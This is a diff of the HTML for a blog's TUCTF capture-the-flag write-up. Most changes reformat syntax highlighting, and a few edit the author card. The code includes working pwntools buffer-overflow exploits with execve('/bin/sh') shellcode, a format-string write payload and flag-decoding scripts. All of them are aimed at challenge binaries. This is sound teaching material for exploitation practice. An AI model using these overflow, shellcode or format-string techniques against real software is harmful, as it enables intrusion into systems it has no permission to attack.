@@ -657,20 +657,20 @@
 <p>The following script is the exploit.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./thefirst</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./thefirst&#34;</span>)
 <span style="color:#75715e"># p = remote(&#34;chal.tuctf.com&#34;, 30508)</span>
 print_flag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80491f6</span>
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">BBBB</span><span style="color:#e6db74">&#34;</span>
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(print_flag_addr)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>
+payload <span style="color:#f92672">+=</span> p32(print_flag_addr)
 
-f <span style="color:#f92672">=</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>)
+f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;payload&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
 f<span style="color:#f92672">.</span>write(payload)
 f<span style="color:#f92672">.</span>close()
 
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 p<span style="color:#f92672">.</span>sendline(payload)
 
 p<span style="color:#f92672">.</span>interactive()
@@ -701,31 +701,31 @@ p<span style="color:#f92672">.</span>interactive()
 </figure>
 
 <p>We use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shell-storm</a> to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &lsquo;A&rsquo;s and then provide the address to write to, i.e. the adress provided to us.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xc0</span><span style="color:#ae81ff">\x50</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x73</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x62</span><span style="color:#ae81ff">\x69</span><span style="color:#ae81ff">\x6e</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xe3</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xc1</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xc2</span><span style="color:#ae81ff">\xb0</span><span style="color:#ae81ff">\x0b</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xc0</span><span style="color:#ae81ff">\x40</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#e6db74">&#34;</span>
 len_shell_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./shellme32</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./shellme32&#34;</span>)
 
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
 
 
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Stack Address: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str(hex(addr)))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Stack Address: &#39;</span> <span style="color:#f92672">+</span> str(hex(addr)))
 
 payload <span style="color:#f92672">=</span> shellcode
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(offset <span style="color:#f92672">-</span> len_shell_code)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset <span style="color:#f92672">-</span> len_shell_code)
 
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(addr)
+payload <span style="color:#f92672">+=</span> p32(addr)
 
 <span style="color:#66d9ef">print</span>(len(shellcode))
 p<span style="color:#f92672">.</span>sendline(payload)
 
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
     f<span style="color:#f92672">.</span>write(payload)
 
 p<span style="color:#f92672">.</span>interactive()
@@ -733,32 +733,32 @@ p<span style="color:#f92672">.</span>interactive()
 <h2 id="shellme64---480-pts">shellme64 - 480 pts</h2>
 <p>This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace <code>p32</code> with <code>p64</code> when adding the stack address to the payload.</p>
 <p>We use <a href="https://www.exploit-db.com/exploits/42179">exploit-db</a> to get the shellcode. The offset of the crash is same as before.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xd2</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xf6</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\xbb</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x62</span><span style="color:#ae81ff">\x69</span><span style="color:#ae81ff">\x6e</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x73</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x53</span><span style="color:#ae81ff">\x54</span><span style="color:#ae81ff">\x5f</span><span style="color:#ae81ff">\xb0</span><span style="color:#ae81ff">\x3b</span><span style="color:#ae81ff">\x0f</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
 len_shell_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./shellme64</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./shellme64&#34;</span>)
 
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
 
 
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">this</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;this</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Stack Address: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str(hex(addr)))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Stack Address: &#39;</span> <span style="color:#f92672">+</span> str(hex(addr)))
 
 payload <span style="color:#f92672">=</span> shellcode
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(offset <span style="color:#f92672">-</span> len(shellcode))
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset <span style="color:#f92672">-</span> len(shellcode))
 
 <span style="color:#75715e"># with open(&#39;payload&#39;, &#39;wb&#39;) as f:</span>
 <span style="color:#75715e">#     f.write(payload)</span>
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(addr)
+payload <span style="color:#f92672">+=</span> p64(addr)
 
 p<span style="color:#f92672">.</span>sendline(payload)
 
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
     f<span style="color:#f92672">.</span>write(payload)
 
 p<span style="color:#f92672">.</span>interactive()
@@ -819,11 +819,11 @@ p<span style="color:#f92672">.</span>interactive()
 <p>We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">printfun</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;printfun&#34;</span>)
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">AAAA</span><span style="color:#e6db74">%</span><span style="color:#e6db74">6$n</span><span style="color:#e6db74">%</span><span style="color:#e6db74">7$n</span><span style="color:#e6db74">&#34;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAA%6$n%7$n&#34;</span>
 
-p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, payload)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;? &#39;</span>, payload)
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><hr>
@@ -905,13 +905,13 @@ p<span style="color:#f92672">.</span>interactive()
 <h3 id="method-1---static">Method 1 - Static</h3>
 <p>Write a script to emulate the functionality of the <code>printFlag</code> function.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printFlag</span>(s):
-    s2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+    s2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
         x <span style="color:#f92672">=</span> ((((ord(s[i]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1d</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x5f</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>
-        s2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(x)
+        s2 <span style="color:#f92672">+=</span> chr(x)
     <span style="color:#66d9ef">print</span>(s2)
 
-printFlag(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">PJ</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k</span><span style="color:#e6db74">&#34;</span>)
+printFlag(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">PJ</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k&#34;</span>)
 </code></pre></div><p>This gives us the flag - <code>TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}</code></p>
 <h3 id="method-2---dynamic">Method 2 - Dynamic</h3>
 <p>Here set a breakpoint in main and then run the following commads in GDB.</p>
@@ -922,19 +922,19 @@ printFlag(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</
 <hr>
 <h2 id="core---400-pts">core - 400 pts</h2>
 <p>We a re provided a core dump and a C file. The C file looks like this</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;  // prints</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt; // malloc</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;string.h&gt; // strcmp</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;unistd.h&gt; // read</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;fcntl.h&gt;  // open</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;unistd.h&gt; // close</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;time.h&gt;   // time</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  // prints</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt; // malloc</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt; // strcmp</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // read</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;  // open</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // close</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;   // time</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
-<span style="color:#75715e">#</span><span style="color:#75715e">define FLAG_LEN 64</span><span style="color:#75715e">
+<span style="color:#75715e">#define FLAG_LEN 64
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> flag[FLAG_LEN];
 
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">xor</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str, <span style="color:#66d9ef">int</span> len) {
-	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> len; i<span style="color:#f92672">+</span><span style="color:#f92672">+</span>) {
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> len; i<span style="color:#f92672">++</span>) {
 		str[i] <span style="color:#f92672">=</span> str[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>;
 	}
 }
@@ -945,7 +945,7 @@ printFlag(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</
 
 	<span style="color:#75715e">// Read the flag
 </span><span style="color:#75715e"></span>	memset(flag, <span style="color:#ae81ff">0</span>, FLAG_LEN);
-	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
 	<span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, flag, FLAG_LEN);
 
 	xor(flag, len);
@@ -982,12 +982,12 @@ printFlag(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</
 </figure>
 
 <p>We find something interesting in the memory. On decoding</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">core_string <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">hex</span><span style="color:#e6db74">&#39;</span>)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">core_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> core_string:
-    flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(i) <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)
+    flag <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)
 
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>The flag - <code>TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}</code></p>
@@ -1118,13 +1118,13 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><sp
   <div class="media author-card content-widget-hr">
     
       
-      <img class="portrait mr-3" src="/authors/admin/avatar_huf7b68353d7bcc081ff7af0a8e00b9689_37035_250x250_fill_q90_lanczos_center.jpg" alt="Avatar">
+      <img class="portrait mr-3" src="/authors/admin/avatar_huf5174f5dbe5058e60bb779cc52d8dfeb_1423398_250x250_fill_q90_lanczos_center.jpg" alt="Avatar">
     
 
     <div class="media-body">
       <h5 class="card-title"><a href="/">Shreyansh Singh</a></h5>
-      <h6 class="card-subtitle">Senior Undergraduate in Computer Science and Engineering</h6>
-      <p class="card-text">My research interests include information security, specially binary analysis and also application of Machine Learning in security.</p>
+      <h6 class="card-subtitle">AI Software Engineer</h6>
+      <p class="card-text">My research interests include information security, especially binary analysis and also the application of Machine Learning in security.</p>
       <ul class="network-icon" aria-hidden="true">
   
     
